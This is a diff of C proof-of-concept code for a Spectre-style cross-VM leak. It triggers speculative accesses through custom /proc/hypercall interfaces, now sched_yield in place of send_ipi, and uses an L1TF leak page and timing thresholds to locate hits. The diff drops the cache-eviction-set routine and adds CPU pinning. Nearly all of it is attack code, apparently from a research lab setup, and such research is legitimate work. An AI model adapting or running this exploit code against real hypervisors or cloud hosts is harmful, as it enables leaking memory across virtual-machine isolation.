@@ -1,7 +1,9 @@
+#define _GNU_SOURCE
 #include <bits/time.h>
 #include <err.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <sched.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -10,16 +12,13 @@
 #include <time.h>
 #include <unistd.h>
 
-#include "asm.h"
-#include "cache_eviction.h"
 #include "constants.h"
 #include "hypercall.h"
 #include "l1tf.h"
 #include "time_deque.h"
-#include "timing.h"
 
-int hypercall(struct send_ipi_hypercall *opts) {
-  const char *hypercall_path = "/proc/hypercall/send_ipi";
+int hypercall(struct sched_yield_hypercall *opts) {
+  const char *hypercall_path = "/proc/hypercall/sched_yield";
   int fd = open(hypercall_path, O_WRONLY);
   if (fd < 0) {
     err(fd, "Failed to open %s", hypercall_path);
@@ -33,44 +32,6 @@ int hypercall(struct send_ipi_hypercall *opts) {
   return b;
 }
 
-void determine_cache_eviction(void *leak) {
-  build_eviction_sets();
-
-  size_t times[L2_SETS];
-  for (size_t i = 0; i < L2_SETS; ++i) {
-    times[i] = -1;
-  }
-
-  int cached_variable = rand();
-
-  for (size_t iterations = 0; iterations < 1000; ++iterations) {
-    for (size_t l2_set = 0; l2_set < L2_SETS; ++l2_set) {
-      maccess(&cached_variable);
-      lfence();
-      evict_l2(l2_set);
-      size_t after = access_time(&cached_variable);
-      times[l2_set] = times[l2_set] > after ? after : times[l2_set];
-    }
-  }
-
-  for (size_t l2_set = 0; l2_set < L2_SETS; ++l2_set) {
-    printf("%5.ld: %ld\n", l2_set, times[l2_set]);
-  }
-
-  return;
-  const char *hypercall_path = "/proc/hypercall/measure_cache_eviction_set";
-  int fd = open(hypercall_path, O_WRONLY);
-  if (fd < 0) {
-    err(fd, "Failed to open %s", hypercall_path);
-  }
-
-  int b = write(fd, leak, HUGE_PAGE_SIZE);
-  close(fd);
-  if (b < 0) {
-    err(errno, "Failed to write to %s", hypercall_path);
-  }
-}
-
 size_t calculate_min(const uintptr_t phys_page_addr, const uintptr_t phys_map_addr) {
   // It is below the phys_map, and thus unreachable
   if (phys_page_addr < phys_map_addr) {
@@ -80,15 +41,16 @@ size_t calculate_min(const uintptr_t phys_page_addr, const uintptr_t phys_map_ad
   return (phys_page_addr - phys_map_addr) / 8;
 }
 
-size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters, int set_idx) {
-  struct send_ipi_hypercall opts = {.real = {.mask_low = -1, .mask_high = -1, .min = 0},
-                                    .mispredicted = {.mask_low = -1, .mask_high = -1, .min = idx},
-                                    .ptr = buf,
-                                    .cache_set_idx = set_idx};
+size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters) {
+  unsigned int cpu = 0;
+  if (getcpu(&cpu, NULL) == -1) {
+    err(EXIT_FAILURE, "Failed to get CPU");
+  }
+
+  struct sched_yield_hypercall opts = {.current_cpu_id = cpu, .speculated_cpu_id = idx, .ptr = buf};
 
   size_t min = -1;
   for (size_t i = 0; i < iters; ++i) {
-    clflush(buf);
     size_t time = hypercall(&opts);
     min = time < min ? time : min;
   }
@@ -134,9 +96,9 @@ size_t find_min(void *buf) {
       for (int64_t page = PAGES_IN_BATCH - 1; page >= 0; --page) {
         size_t idx = batch + (ELEMENTS_PER_PAGE * page) + offset;
 
-        size_t time = access_buffer_with_spectre(buf, idx, 1, 0);
+        size_t time = access_buffer_with_spectre(buf, idx, 1);
         if (time < 220) {
-          time = access_buffer_with_spectre(buf, idx, 1000, 0);
+          time = access_buffer_with_spectre(buf, idx, 1000);
           if (time < 100) {
             printf("\nhit: %lx %ld\n", idx, time);
             return idx;
@@ -157,7 +119,7 @@ size_t find_min(void *buf) {
 void cmd_determine(void *leak_page) {
   *(uint64_t *)leak_page = page_value;
   getchar();
-  access_buffer_with_spectre(leak_page, 1, 1, 0);
+  access_buffer_with_spectre(leak_page, 1, 1);
   *(uint64_t *)leak_page = 0;
 }
 
@@ -205,14 +167,24 @@ void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
   // memcpy(leak_page, needle, needle_size);
   const size_t iterations = 1000;
   printf("Doing %ld iterations\n", iterations);
-  for (int set_idx = 0; set_idx < 1; ++set_idx) {
-    size_t hit = access_buffer_with_spectre(leak_page, min, iterations, set_idx);
-    size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations, set_idx);
+  size_t hit = access_buffer_with_spectre(leak_page, min, iterations);
+  size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations);
 
-    printf("%d\tMiss: %ld\tHit: %ld\n", set_idx, miss, hit);
-  }
+  printf("Miss: %ld\tHit: %ld\n", miss, hit);
 
   // memset(leak_page, 0, needle_size);
+}
+
+void pin_cpu(void) {
+  unsigned int cpu = 0;
+  if (getcpu(&cpu, NULL) == -1) {
+    err(EXIT_FAILURE, "Failed to get CPU");
+  }
+
+  cpu_set_t s;
+  CPU_ZERO(&s);
+  CPU_SET(cpu, &s);
+  sched_setaffinity(0, sizeof(cpu_set_t), &s);
 }
 
 int main(int argc, char *argv[argc]) {
@@ -223,6 +195,8 @@ int main(int argc, char *argv[argc]) {
     errno = EINVAL;
     err(errno, "Invalid usage");
   }
+
+  pin_cpu();
 
   void *leak_page = l1tf_spawn_leak_page();
 
@@ -237,8 +211,6 @@ int main(int argc, char *argv[argc]) {
   } else if (!strcmp(argv[1], "find_min")) {
     size_t min = find_min(leak_page);
     printf("Min: %ld (or 0x%lx)\n", min, min);
-  } else if (!strcmp(argv[1], "cache_evict")) {
-    determine_cache_eviction(leak_page);
   }
 
   munmap(leak_page, PAGE_SIZE);
